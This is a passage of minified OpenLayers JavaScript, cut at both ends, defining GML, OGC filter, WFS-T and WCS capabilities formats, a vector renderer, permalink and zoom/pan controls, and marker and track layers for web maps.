b}},OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs},\nCLASS_NAME:\"OpenLayers.Format.GML.v2\"});OpenLayers.Format.Filter.v1_0_0=OpenLayers.Class(OpenLayers.Format.GML.v2,OpenLayers.Format.Filter.v1,{VERSION:\"1.0.0\",schemaLocation:\"http://www.opengis.net/ogc/filter/1.0.0/filter.xsd\",initialize:function(a){OpenLayers.Format.GML.v2.prototype.initialize.apply(this,[a])},readers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsNotEqualTo:function(a,\nb){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLike:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LIKE});this.readChildNodes(a,c);var d=a.getAttribute(\"wildCard\"),e=a.getAttribute(\"singleChar\"),f=a.getAttribute(\"escape\");c.value2regex(d,e,f);b.filters.push(c)}},OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v2.prototype.readers.gml,\nfeature:OpenLayers.Format.GML.v2.prototype.readers.feature},writers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsEqualTo\");this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsNotEqualTo:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsNotEqualTo\");this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLike:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsLike\",\n{attributes:{wildCard:\"*\",singleChar:\".\",escape:\"!\"}});this.writeNode(\"PropertyName\",a,b);this.writeNode(\"Literal\",a.regex2value(),b);return b},BBOX:function(a){var b=this.createElementNSPlus(\"ogc:BBOX\");a.property&&this.writeNode(\"PropertyName\",a,b);var c=this.writeNode(\"gml:Box\",a.value,b);a.projection&&c.setAttribute(\"srsName\",a.projection);return b}},OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature},\nwriteSpatial:function(a,b){var c=this.createElementNSPlus(\"ogc:\"+b);this.writeNode(\"PropertyName\",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode(\"Function\",a.value,c);else{var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode(\"feature:_geometry\",a.value).firstChild:this.writeNode(\"gml:Box\",a.value);a.projection&&d.setAttribute(\"srsName\",a.projection);c.appendChild(d)}return c},CLASS_NAME:\"OpenLayers.Format.Filter.v1_0_0\"});OpenLayers.Format.WFST.v1_0_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,OpenLayers.Format.WFST.v1,{version:\"1.0.0\",srsNameInQuery:!1,schemaLocations:{wfs:\"http://schemas.opengis.net/wfs/1.0.0/WFS-transaction.xsd\"},initialize:function(a){OpenLayers.Format.Filter.v1_0_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])},readNode:function(a,b,c){return OpenLayers.Format.GML.v2.prototype.readNode.apply(this,arguments)},readers:{wfs:OpenLayers.Util.applyDefaults({WFS_TransactionResponse:function(a,\nb){b.insertIds=[];b.success=!1;this.readChildNodes(a,b)},InsertResult:function(a,b){var c={fids:[]};this.readChildNodes(a,c);b.insertIds=b.insertIds.concat(c.fids)},TransactionResult:function(a,b){this.readChildNodes(a,b)},Status:function(a,b){this.readChildNodes(a,b)},SUCCESS:function(a,b){b.success=!0}},OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v2.prototype.readers.gml,feature:OpenLayers.Format.GML.v2.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.readers.ogc},\nwriters:{wfs:OpenLayers.Util.applyDefaults({Query:function(a){a=OpenLayers.Util.extend({featureNS:this.featureNS,featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName,srsNameInQuery:this.srsNameInQuery},a);var b=a.featurePrefix,c=this.createElementNSPlus(\"wfs:Query\",{attributes:{typeName:(b?b+\":\":\"\")+a.featureType}});a.srsNameInQuery&&a.srsName&&c.setAttribute(\"srsName\",a.srsName);a.featureNS&&c.setAttribute(\"xmlns:\"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b<\nd;b++)this.writeNode(\"ogc:PropertyName\",{property:a.propertyNames[b]},c);a.filter&&(this.setFilterProperty(a.filter),this.writeNode(\"ogc:Filter\",a.filter,c));return c}},OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.writers.ogc},CLASS_NAME:\"OpenLayers.Format.WFST.v1_0_0\"});OpenLayers.ElementsIndexer=OpenLayers.Class({maxZIndex:null,order:null,indices:null,compare:null,initialize:function(a){this.compare=a?OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_Y_ORDER:OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER_DRAWING_ORDER;this.clear()},insert:function(a){this.exists(a)&&this.remove(a);var b=a.id;this.determineZIndex(a);for(var c=-1,d=this.order.length,e;1<d-c;)e=parseInt((c+d)/2),0<this.compare(this,a,OpenLayers.Util.getElement(this.order[e]))?c=e:d=e;this.order.splice(d,\n0,b);this.indices[b]=this.getZIndex(a);return this.getNextElement(d)},remove:function(a){a=a.id;var b=OpenLayers.Util.indexOf(this.order,a);0<=b&&(this.order.splice(b,1),delete this.indices[a],this.maxZIndex=0<this.order.length?this.indices[this.order[this.order.length-1]]:0)},clear:function(){this.order=[];this.indices={};this.maxZIndex=0},exists:function(a){return null!=this.indices[a.id]},getZIndex:function(a){return a._style.graphicZIndex},determineZIndex:function(a){var b=a._style.graphicZIndex;\nnull==b?(b=this.maxZIndex,a._style.graphicZIndex=b):b>this.maxZIndex&&(this.maxZIndex=b)},getNextElement:function(a){a+=1;if(a<this.order.length){var b=OpenLayers.Util.getElement(this.order[a]);void 0==b&&(b=this.getNextElement(a));return b}return null},CLASS_NAME:\"OpenLayers.ElementsIndexer\"});\nOpenLayers.ElementsIndexer.IndexingMethods={Z_ORDER:function(a,b,c){b=a.getZIndex(b);var d=0;c&&(a=a.getZIndex(c),d=b-a);return d},Z_ORDER_DRAWING_ORDER:function(a,b,c){a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&&0==a&&(a=1);return a},Z_ORDER_Y_ORDER:function(a,b,c){a=OpenLayers.ElementsIndexer.IndexingMethods.Z_ORDER(a,b,c);c&&0===a&&(b=c._boundsBottom-b._boundsBottom,a=0===b?1:b);return a}};\nOpenLayers.Renderer.Elements=OpenLayers.Class(OpenLayers.Renderer,{rendererRoot:null,root:null,vectorRoot:null,textRoot:null,xmlns:null,xOffset:0,indexer:null,BACKGROUND_ID_SUFFIX:\"_background\",LABEL_ID_SUFFIX:\"_label\",LABEL_OUTLINE_SUFFIX:\"_outline\",initialize:function(a,b){OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.rendererRoot=this.createRenderRoot();this.root=this.createRoot(\"_root\");this.vectorRoot=this.createRoot(\"_vroot\");this.textRoot=this.createRoot(\"_troot\");this.root.appendChild(this.vectorRoot);\nthis.root.appendChild(this.textRoot);this.rendererRoot.appendChild(this.root);this.container.appendChild(this.rendererRoot);b&&(b.zIndexing||b.yOrdering)&&(this.indexer=new OpenLayers.ElementsIndexer(b.yOrdering))},destroy:function(){this.clear();this.xmlns=this.root=this.rendererRoot=null;OpenLayers.Renderer.prototype.destroy.apply(this,arguments)},clear:function(){var a,b=this.vectorRoot;if(b)for(;a=b.firstChild;)b.removeChild(a);if(b=this.textRoot)for(;a=b.firstChild;)b.removeChild(a);this.indexer&&\nthis.indexer.clear()},setExtent:function(a,b){var c=OpenLayers.Renderer.prototype.setExtent.apply(this,arguments),d=this.getResolution();if(this.map.baseLayer&&this.map.baseLayer.wrapDateLine){var e,f=a.getWidth()/this.map.getExtent().getWidth();a=a.scale(1/f);f=this.map.getMaxExtent();f.right>a.left&&f.right<a.right?e=!0:f.left>a.left&&f.left<a.right&&(e=!1);if(e!==this.rightOfDateLine||b)c=!1,this.xOffset=!0===e?f.getWidth()/d:0;this.rightOfDateLine=e}return c},getNodeType:function(a,b){},drawGeometry:function(a,\nb,c){var d=a.CLASS_NAME,e=!0;if(\"OpenLayers.Geometry.Collection\"==d||\"OpenLayers.Geometry.MultiPoint\"==d||\"OpenLayers.Geometry.MultiLineString\"==d||\"OpenLayers.Geometry.MultiPolygon\"==d){for(var d=0,f=a.components.length;d<f;d++)e=this.drawGeometry(a.components[d],b,c)&&e;return e}d=e=!1;\"none\"!=b.display&&(b.backgroundGraphic?this.redrawBackgroundNode(a.id,a,b,c):d=!0,e=this.redrawNode(a.id,a,b,c));!1==e&&(b=document.getElementById(a.id))&&(b._style.backgroundGraphic&&(d=!0),b.parentNode.removeChild(b));\nd&&(b=document.getElementById(a.id+this.BACKGROUND_ID_SUFFIX))&&b.parentNode.removeChild(b);return e},redrawNode:function(a,b,c,d){c=this.applyDefaultSymbolizer(c);a=this.nodeFactory(a,this.getNodeType(b,c));a._featureId=d;a._boundsBottom=b.getBounds().bottom;a._geometryClass=b.CLASS_NAME;a._style=c;b=this.drawGeometryNode(a,b,c);if(!1===b)return!1;a=b.node;this.indexer?(c=this.indexer.insert(a))?this.vectorRoot.insertBefore(a,c):this.vectorRoot.appendChild(a):a.parentNode!==this.vectorRoot&&this.vectorRoot.appendChild(a);\nthis.postDraw(a);return b.complete},redrawBackgroundNode:function(a,b,c,d){c=OpenLayers.Util.extend({},c);c.externalGraphic=c.backgroundGraphic;c.graphicXOffset=c.backgroundXOffset;c.graphicYOffset=c.backgroundYOffset;c.graphicZIndex=c.backgroundGraphicZIndex;c.graphicWidth=c.backgroundWidth||c.graphicWidth;c.graphicHeight=c.backgroundHeight||c.graphicHeight;c.backgroundGraphic=null;c.backgroundXOffset=null;c.backgroundYOffset=null;c.backgroundGraphicZIndex=null;return this.redrawNode(a+this.BACKGROUND_ID_SUFFIX,\nb,c,null)},drawGeometryNode:function(a,b,c){c=c||a._style;var d={isFilled:void 0===c.fill?!0:c.fill,isStroked:void 0===c.stroke?!!c.strokeWidth:c.stroke},e;switch(b.CLASS_NAME){case \"OpenLayers.Geometry.Point\":!1===c.graphic&&(d.isFilled=!1,d.isStroked=!1);e=this.drawPoint(a,b);break;case \"OpenLayers.Geometry.LineString\":d.isFilled=!1;e=this.drawLineString(a,b);break;case \"OpenLayers.Geometry.LinearRing\":e=this.drawLinearRing(a,b);break;case \"OpenLayers.Geometry.Polygon\":e=this.drawPolygon(a,b);break;\ncase \"OpenLayers.Geometry.Rectangle\":e=this.drawRectangle(a,b)}a._options=d;return!1!=e?{node:this.setStyle(a,c,d,b),complete:e}:!1},postDraw:function(a){},drawPoint:function(a,b){},drawLineString:function(a,b){},drawLinearRing:function(a,b){},drawPolygon:function(a,b){},drawRectangle:function(a,b){},drawCircle:function(a,b){},removeText:function(a){var b=document.getElementById(a+this.LABEL_ID_SUFFIX);b&&this.textRoot.removeChild(b);(a=document.getElementById(a+this.LABEL_OUTLINE_SUFFIX))&&this.textRoot.removeChild(a)},\ngetFeatureIdFromEvent:function(a){var b=a.target,c=b&&b.correspondingUseElement;return(c?c:b||a.srcElement)._featureId},eraseGeometry:function(a,b){if(\"OpenLayers.Geometry.MultiPoint\"==a.CLASS_NAME||\"OpenLayers.Geometry.MultiLineString\"==a.CLASS_NAME||\"OpenLayers.Geometry.MultiPolygon\"==a.CLASS_NAME||\"OpenLayers.Geometry.Collection\"==a.CLASS_NAME)for(var c=0,d=a.components.length;c<d;c++)this.eraseGeometry(a.components[c],b);else(c=OpenLayers.Util.getElement(a.id))&&c.parentNode&&(c.geometry&&(c.geometry.destroy(),\nc.geometry=null),c.parentNode.removeChild(c),this.indexer&&this.indexer.remove(c),c._style.backgroundGraphic&&(c=OpenLayers.Util.getElement(a.id+this.BACKGROUND_ID_SUFFIX))&&c.parentNode&&c.parentNode.removeChild(c))},nodeFactory:function(a,b){var c=OpenLayers.Util.getElement(a);c?this.nodeTypeCompare(c,b)||(c.parentNode.removeChild(c),c=this.nodeFactory(a,b)):c=this.createNode(b,a);return c},nodeTypeCompare:function(a,b){},createNode:function(a,b){},moveRoot:function(a){var b=this.root;a.root.parentNode==\nthis.rendererRoot&&(b=a.root);b.parentNode.removeChild(b);a.rendererRoot.appendChild(b)},getRenderLayerId:function(){return this.root.parentNode.parentNode.id},isComplexSymbol:function(a){return\"circle\"!=a&&!!a},CLASS_NAME:\"OpenLayers.Renderer.Elements\"});OpenLayers.Control.ArgParser=OpenLayers.Class(OpenLayers.Control,{center:null,zoom:null,layers:null,displayProjection:null,getParameters:function(a){a=a||window.location.href;var b=OpenLayers.Util.getParameters(a),c=a.indexOf(\"#\");0<c&&(a=\"?\"+a.substring(c+1,a.length),OpenLayers.Util.extend(b,OpenLayers.Util.getParameters(a)));return b},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b<c;b++){var d=this.map.controls[b];if(d!=this&&\n\"OpenLayers.Control.ArgParser\"==d.CLASS_NAME){d.displayProjection!=this.displayProjection&&(this.displayProjection=d.displayProjection);break}}b==this.map.controls.length&&(b=this.getParameters(),b.layers&&(this.layers=b.layers,this.map.events.register(\"addlayer\",this,this.configureLayers),this.configureLayers()),b.lat&&b.lon&&(this.center=new OpenLayers.LonLat(parseFloat(b.lon),parseFloat(b.lat)),b.zoom&&(this.zoom=parseFloat(b.zoom)),this.map.events.register(\"changebaselayer\",this,this.setCenter),\nthis.setCenter()))},setCenter:function(){this.map.baseLayer&&(this.map.events.unregister(\"changebaselayer\",this,this.setCenter),this.displayProjection&&this.center.transform(this.displayProjection,this.map.getProjectionObject()),this.map.setCenter(this.center,this.zoom))},configureLayers:function(){if(this.layers.length==this.map.layers.length){this.map.events.unregister(\"addlayer\",this,this.configureLayers);for(var a=0,b=this.layers.length;a<b;a++){var c=this.map.layers[a],d=this.layers.charAt(a);\n\"B\"==d?this.map.setBaseLayer(c):\"T\"!=d&&\"F\"!=d||c.setVisibility(\"T\"==d)}}},CLASS_NAME:\"OpenLayers.Control.ArgParser\"});OpenLayers.Control.Permalink=OpenLayers.Class(OpenLayers.Control,{argParserClass:OpenLayers.Control.ArgParser,element:null,anchor:!1,base:\"\",displayProjection:null,initialize:function(a,b,c){null===a||\"object\"!=typeof a||OpenLayers.Util.isElement(a)?(OpenLayers.Control.prototype.initialize.apply(this,[c]),this.element=OpenLayers.Util.getElement(a),this.base=b||document.location.href):(this.base=document.location.href,OpenLayers.Control.prototype.initialize.apply(this,[a]),null!=this.element&&(this.element=\nOpenLayers.Util.getElement(this.element)))},destroy:function(){this.element&&this.element.parentNode==this.div&&(this.div.removeChild(this.element),this.element=null);this.map&&this.map.events.unregister(\"moveend\",this,this.updateLink);OpenLayers.Control.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);for(var b=0,c=this.map.controls.length;b<c;b++){var d=this.map.controls[b];if(d.CLASS_NAME==this.argParserClass.CLASS_NAME){d.displayProjection!=\nthis.displayProjection&&(this.displayProjection=d.displayProjection);break}}b==this.map.controls.length&&this.map.addControl(new this.argParserClass({displayProjection:this.displayProjection}))},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||this.anchor||(this.element=document.createElement(\"a\"),this.element.innerHTML=OpenLayers.i18n(\"Permalink\"),this.element.href=\"\",this.div.appendChild(this.element));this.map.events.on({moveend:this.updateLink,changelayer:this.updateLink,\nchangebaselayer:this.updateLink,scope:this});this.updateLink();return this.div},updateLink:function(){var a=this.anchor?\"#\":\"?\",b=this.base,c=null;-1!=b.indexOf(\"#\")&&!1==this.anchor&&(c=b.substring(b.indexOf(\"#\"),b.length));-1!=b.indexOf(a)&&(b=b.substring(0,b.indexOf(a)));b=b.split(\"#\")[0]+a+OpenLayers.Util.getParameterString(this.createParams());c&&(b+=c);this.anchor&&!this.element?window.location.href=b:this.element.href=b},createParams:function(a,b,c){a=a||this.map.getCenter();var d=OpenLayers.Util.getParameters(this.base);\nif(a)for(d.zoom=b||this.map.getZoom(),b=a.lat,a=a.lon,this.displayProjection&&(b=OpenLayers.Projection.transform({x:a,y:b},this.map.getProjectionObject(),this.displayProjection),a=b.x,b=b.y),d.lat=Math.round(1E5*b)/1E5,d.lon=Math.round(1E5*a)/1E5,c=c||this.map.layers,d.layers=\"\",a=0,b=c.length;a<b;a++){var e=c[a];d.layers=e.isBaseLayer?d.layers+(e==this.map.baseLayer?\"B\":\"0\"):d.layers+(e.getVisibility()?\"T\":\"F\")}return d},CLASS_NAME:\"OpenLayers.Control.Permalink\"});OpenLayers.Layer.TMS=OpenLayers.Class(OpenLayers.Layer.Grid,{serviceVersion:\"1.0.0\",layername:null,type:null,isBaseLayer:!0,tileOrigin:null,serverResolutions:null,zoomOffset:0,initialize:function(a,b,c){var d=[];d.push(a,b,{},c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,d)},clone:function(a){null==a&&(a=new OpenLayers.Layer.TMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=this.getServerResolution(),\nc=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((a.bottom-this.tileOrigin.lat)/(b*this.tileSize.h));b=this.getServerZoom();c=this.serviceVersion+\"/\"+this.layername+\"/\"+b+\"/\"+c+\"/\"+a+\".\"+this.type;a=this.url;OpenLayers.Util.isArray(a)&&(a=this.selectUrl(c,a));return a+c},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left,this.map.maxExtent.bottom))},CLASS_NAME:\"OpenLayers.Layer.TMS\"});OpenLayers.Format.WCSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.1.0\",CLASS_NAME:\"OpenLayers.Format.WCSCapabilities\"});OpenLayers.Format.WCSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\\s*|\\s*$/g,splitSpace:/\\s+/},defaultPrefix:\"wcs\",read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},CLASS_NAME:\"OpenLayers.Format.WCSCapabilities.v1\"});OpenLayers.Format.WCSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,{namespaces:{wcs:\"http://www.opengis.net/wcs\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\",ows:\"http://www.opengis.net/ows\"},errorProperty:\"service\",readers:{wcs:{WCS_Capabilities:function(a,b){this.readChildNodes(a,b)},Service:function(a,b){b.service={};this.readChildNodes(a,b.service)},name:function(a,b){b.name=this.getChildValue(a)},label:function(a,b){b.label=\nthis.getChildValue(a)},keywords:function(a,b){b.keywords=[];this.readChildNodes(a,b.keywords)},keyword:function(a,b){b.push(this.getChildValue(a))},responsibleParty:function(a,b){b.responsibleParty={};this.readChildNodes(a,b.responsibleParty)},individualName:function(a,b){b.individualName=this.getChildValue(a)},organisationName:function(a,b){b.organisationName=this.getChildValue(a)},positionName:function(a,b){b.positionName=this.getChildValue(a)},contactInfo:function(a,b){b.contactInfo={};this.readChildNodes(a,\nb.contactInfo)},phone:function(a,b){b.phone={};this.readChildNodes(a,b.phone)},voice:function(a,b){b.voice=this.getChildValue(a)},facsimile:function(a,b){b.facsimile=this.getChildValue(a)},address:function(a,b){b.address={};this.readChildNodes(a,b.address)},deliveryPoint:function(a,b){b.deliveryPoint=this.getChildValue(a)},city:function(a,b){b.city=this.getChildValue(a)},postalCode:function(a,b){b.postalCode=this.getChildValue(a)},country:function(a,b){b.country=this.getChildValue(a)},electronicMailAddress:function(a,\nb){b.electronicMailAddress=this.getChildValue(a)},fees:function(a,b){b.fees=this.getChildValue(a)},accessConstraints:function(a,b){b.accessConstraints=this.getChildValue(a)},ContentMetadata:function(a,b){b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)},CoverageOfferingBrief:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},name:function(a,b){b.name=this.getChildValue(a)},label:function(a,b){b.label=this.getChildValue(a)},lonLatEnvelope:function(a,b){var c=this.getElementsByTagNameNS(a,\n\"http://www.opengis.net/gml\",\"pos\");if(2==c.length){var d={},e={};OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[0],d]);OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[c[1],e]);b.lonLatEnvelope={};b.lonLatEnvelope.srsName=a.getAttribute(\"srsName\");b.lonLatEnvelope.min=d.points[0];b.lonLatEnvelope.max=e.points[0]}}}},CLASS_NAME:\"OpenLayers.Format.WCSCapabilities.v1_0_0\"});OpenLayers.Strategy.Fixed=OpenLayers.Class(OpenLayers.Strategy,{preload:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);if(a)if(this.layer.events.on({refresh:this.load,scope:this}),!0==this.layer.visibility||this.preload)this.load();else this.layer.events.on({visibilitychanged:this.load,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&&this.layer.events.un({refresh:this.load,visibilitychanged:this.load,\nscope:this});return a},load:function(a){var b=this.layer;b.events.triggerEvent(\"loadstart\",{filter:b.filter});b.protocol.read(OpenLayers.Util.applyDefaults({callback:this.merge,filter:b.filter,scope:this},a));b.events.un({visibilitychanged:this.load,scope:this})},merge:function(a){var b=this.layer;b.destroyFeatures();var c=a.features;if(c&&0<c.length){var d=b.projection,e=b.map.getProjectionObject();if(!e.equals(d))for(var f,g=0,h=c.length;g<h;++g)(f=c[g].geometry)&&f.transform(d,e);b.addFeatures(c)}b.events.triggerEvent(\"loadend\",\n{response:a})},CLASS_NAME:\"OpenLayers.Strategy.Fixed\"});OpenLayers.Control.Zoom=OpenLayers.Class(OpenLayers.Control,{zoomInText:\"+\",zoomInId:\"olZoomInLink\",zoomOutText:\"\\u2212\",zoomOutId:\"olZoomOutLink\",draw:function(){var a=OpenLayers.Control.prototype.draw.apply(this),b=this.getOrCreateLinks(a),c=b.zoomIn,b=b.zoomOut,d=this.map.events;b.parentNode!==a&&(d=this.events,d.attachToElement(b.parentNode));d.register(\"buttonclick\",this,this.onZoomClick);this.zoomInLink=c;this.zoomOutLink=b;return a},getOrCreateLinks:function(a){var b=document.getElementById(this.zoomInId),\nc=document.getElementById(this.zoomOutId);b||(b=document.createElement(\"a\"),b.href=\"#zoomIn\",b.appendChild(document.createTextNode(this.zoomInText)),b.className=\"olControlZoomIn\",a.appendChild(b));OpenLayers.Element.addClass(b,\"olButton\");c||(c=document.createElement(\"a\"),c.href=\"#zoomOut\",c.appendChild(document.createTextNode(this.zoomOutText)),c.className=\"olControlZoomOut\",a.appendChild(c));OpenLayers.Element.addClass(c,\"olButton\");return{zoomIn:b,zoomOut:c}},onZoomClick:function(a){a=a.buttonElement;\na===this.zoomInLink?this.map.zoomIn():a===this.zoomOutLink&&this.map.zoomOut()},destroy:function(){this.map&&this.map.events.unregister(\"buttonclick\",this,this.onZoomClick);delete this.zoomInLink;delete this.zoomOutLink;OpenLayers.Control.prototype.destroy.apply(this)},CLASS_NAME:\"OpenLayers.Control.Zoom\"});OpenLayers.Layer.PointTrack=OpenLayers.Class(OpenLayers.Layer.Vector,{dataFrom:null,styleFrom:null,addNodes:function(a,b){if(2>a.length)throw Error(\"At least two point features have to be added to create a line from\");for(var c=Array(a.length-1),d,e,f,g=0,h=a.length;g<h;g++){d=a[g];f=d.geometry;if(!f)f=d.lonlat,f=new OpenLayers.Geometry.Point(f.lon,f.lat);else if(\"OpenLayers.Geometry.Point\"!=f.CLASS_NAME)throw new TypeError(\"Only features with point geometries are supported.\");if(0<g){d=null!=this.dataFrom?\na[g+this.dataFrom].data||a[g+this.dataFrom].attributes:null;var k=null!=this.styleFrom?a[g+this.styleFrom].style:null;e=new OpenLayers.Geometry.LineString([e,f]);c[g-1]=new OpenLayers.Feature.Vector(e,d,k)}e=f}this.addFeatures(c,b)},CLASS_NAME:\"OpenLayers.Layer.PointTrack\"});OpenLayers.Layer.PointTrack.SOURCE_NODE=-1;OpenLayers.Layer.PointTrack.TARGET_NODE=0;OpenLayers.Layer.PointTrack.dataFrom={SOURCE_NODE:-1,TARGET_NODE:0};OpenLayers.Protocol.WFS=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.WFS.DEFAULTS);var b=OpenLayers.Protocol.WFS[\"v\"+a.version.replace(/\\./g,\"_\")];if(!b)throw\"Unsupported WFS version: \"+a.version;return new b(a)};\nOpenLayers.Protocol.WFS.fromWMSLayer=function(a,b){var c,d;c=a.params.LAYERS;c=(OpenLayers.Util.isArray(c)?c[0]:c).split(\":\");1<c.length&&(d=c[0]);c=c.pop();d={url:a.url,featureType:c,featurePrefix:d,srsName:a.projection&&a.projection.getCode()||a.map&&a.map.getProjectionObject().getCode(),version:\"1.1.0\"};return new OpenLayers.Protocol.WFS(OpenLayers.Util.applyDefaults(b,d))};OpenLayers.Protocol.WFS.DEFAULTS={version:\"1.0.0\"};OpenLayers.Layer.Markers=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!1,markers:null,drawn:!1,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.markers=[]},destroy:function(){this.clearMarkers();this.markers=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},setOpacity:function(a){if(a!=this.opacity){this.opacity=a;a=0;for(var b=this.markers.length;a<b;a++)this.markers[a].setOpacity(this.opacity)}},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,\narguments);if(b||!this.drawn){for(var d=0,e=this.markers.length;d<e;d++)this.drawMarker(this.markers[d]);this.drawn=!0}},addMarker:function(a){this.markers.push(a);1>this.opacity&&a.setOpacity(this.opacity);this.map&&this.map.getExtent()&&(a.map=this.map,this.drawMarker(a))},removeMarker:function(a){this.markers&&this.markers.length&&(OpenLayers.Util.removeItem(this.markers,a),a.erase())},clearMarkers:function(){if(null!=this.markers)for(;0<this.markers.length;)this.removeMarker(this.markers[0])},\ndrawMarker:function(a){var b=this.map.getLayerPxFromLonLat(a.lonlat);null==b?a.display(!1):a.isDrawn()?a.icon&&a.icon.moveTo(b):(a=a.draw(b),this.div.appendChild(a))},getDataExtent:function(){var a=null;if(this.markers&&0<this.markers.length)for(var a=new OpenLayers.Bounds,b=0,c=this.markers.length;b<c;b++)a.extend(this.markers[b].lonlat);return a},CLASS_NAME:\"OpenLayers.Layer.Markers\"});OpenLayers.Control.Pan=OpenLayers.Class(OpenLayers.Control.Button,{slideFactor:50,slideRatio:null,direction:null,initialize:function(a,b){this.direction=a;this.CLASS_NAME+=this.direction;OpenLayers.Control.prototype.initialize.apply(this,[b])},trigger:function(){if(this.map){var a=OpenLayers.Function.bind(function(a){return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor},this);switch(this.direction){case OpenLayers.Control.Pan.NORTH:this.map.pan(0,-a(\"h\"));break;case OpenLayers.Control.Pan.SOUTH:this.map.pan(0,\na(\"h\"));break;case OpenLayers.Control.Pan.WEST:this.map.pan(-a(\"w\"),0);break;case OpenLayers.Control.Pan.EAST:this.map.pan(a(\"w\"),0)}}},CLASS_NAME:\"OpenLayers.Control.Pan\"});OpenLayers.Control.Pan.NORTH=\"North\";OpenLayers.Control.Pan.SOUTH=\"South\";OpenLayers.Control.Pan.EAST=\"East\";OpenLayers.Control.Pan.WEST=\"West\";OpenLayers.Format.CSWGetDomain=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetDomain.DEFAULTS);var b=OpenLayers.Format.CSWGetDomain[\"v\"+a.version.replace(/\\./g,\"_\")];if(!b)throw\"Unsupported CSWGetDomain version: \"+a.version;return new b(a)};OpenLayers.Format.CSWGetDomain.DEFAULTS={version:\"2.0.2\"};OpenLayers.Format.CSWGetDomain.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\",csw:\"http://www.opengis.net/cat/csw/2.0.2\"},defaultPrefix:\"csw\",version:\"2.0.2\",schemaLocation:\"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd\",PropertyName:null,ParameterName:null,read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==\na.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{csw:{GetDomainResponse:function(a,b){this.readChildNodes(a,b)},DomainValues:function(a,b){OpenLayers.Util.isArray(b.DomainValues)||(b.DomainValues=[]);for(var 